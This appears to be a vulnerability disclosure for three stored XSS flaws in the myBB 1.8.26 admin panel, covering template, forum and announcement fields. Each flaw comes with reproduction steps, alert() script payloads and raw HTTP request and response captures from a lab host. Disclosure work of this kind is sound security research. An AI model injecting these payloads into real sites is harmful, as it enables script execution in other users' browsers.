### myBB Forum Stored XSS

Stored XSS #1:


To reproduce do the following:

1. Login as administrator user
2. Browse to "Templates and Style" -> "Templates" -> "Manage Templates" -> "Global 
Templates" 
3. Select "Add New Template" and enter payload "><img src=x onerror=alert(1)>


```
// HTTP POST request showing XSS payload

POST /mybb_1826/admin/index.php?module=style-templates&action=edit_template HTTP/1.1
Host: 192.168.139.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
[...]

my_post_key=60dcf2a0bf3090dbd2c33cd18733dc4c&title="><img+src=x+onerror=alert(1)>&sid=-1&template=&continue=Save+and+Continue+Editing


// HTTP redirect response to specific template

HTTP/1.1 302 Found
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev Perl/v5.16.3
Location: index.php?module=style-templates&action=edit_template&title=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&sid=-1
[...]


// HTTP GET request to newly created template

GET /mybb_1826/admin/index.php?module=style-templates&sid=-1 HTTP/1.1
Host: 192.168.139.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
[...]


// HTTP response showing unsanitized XSS payload

HTTP/1.1 200 OK
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev Perl/v5.16.3
X-Powered-By: PHP/5.6.40
[...]

<tr class="first">
<td class="first"><a href="index.php?module=style-templates&amp;action=edit_template&amp;title=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&amp;sid=-1">"><img src=x onerror=alert(1)></a></td>
[...]
```



Stored XSS #2:


To reproduce do the following:
1. Login as administrator user
2. Browse to "Forums and Posts" -> "Forum Management"
3. Select "Add New Forum" and enter payload "><script>alert(1)</script>


```
// HTTP POST request showing XSS payload
POST /mybb_1826/admin/index.php?module=forum-management&action=add HTTP/1.1
Host: 192.168.139.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 
Firefox/106.0
[...]
my_post_key=60dcf2a0bf3090dbd2c33cd18733dc4c&type=f&title="><script>alert(1)</
script>&description="><script>alert(2)</script[...]


// HTTP response showing successfully added a new forum
HTTP/1.1 200 OK
Date: Sun, 20 Nov 2022 11:00:28 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev 
Perl/v5.16.3
[...]


// HTTP GET request to fetch forums
GET /mybb_1826/admin/index.php?module=forum-management HTTP/1.1
Host: 192.168.139.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 
Firefox/106.0
[...]

// HTTP response showing unsanitized XSS payload
HTTP/1.1 200 OK
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev 
Perl/v5.16.3
[...]
<small>Sub Forums:  <a href="index.php?module=forum-management&amp;fid=3">"><script>alert(1)</script></a></small>
```


Stored XSS #3:


To reproduce do the following:
1. Login as administrator user
2. Browse to "Forums and Posts" -> "Forum Announcements"
3. Select "Add Announcement" and enter payload "><img+src=x+onerror=alert(1)>


```
// HTTP POST request showing XSS payload
POST /mybb_1826/admin/index.php?module=forum-announcements&action=add HTTP/1.1
Host: 192.168.139.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 
Firefox/106.0
[...]

my_post_key=60dcf2a0bf3090dbd2c33cd18733dc4c&title="><img+src=x+onerror=alert(1)>&s
tarttime_day=20&starttime_month=11&starttime_year=2022&starttime_time=11:05+AM&endt
ime_day=20&endtime_month=11&endtime_year=2023&endtime_time=11:05+AM&endtime_type=2&
message="><script>alert(2)</script>&fid=2&allowmycode=1&allowsmilies=1

// HTTP response showing successfully added an anouncement
HTTP/1.1 302 Found
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev 
Perl/v5.16.3
[...]


// HTTP GET request to fetch forum URL
GET /mybb_1826/ HTTP/1.1
Host: 192.168.139.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 
Firefox/106.0
[...]

// HTTP response showing unsanitized XSS payload
HTTP/1.1 200 OK
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev 
Perl/v5.16.3
[...]
<a href="forumdisplay.php?fid=3" title="">"><script>alert(1)</script></a>
```




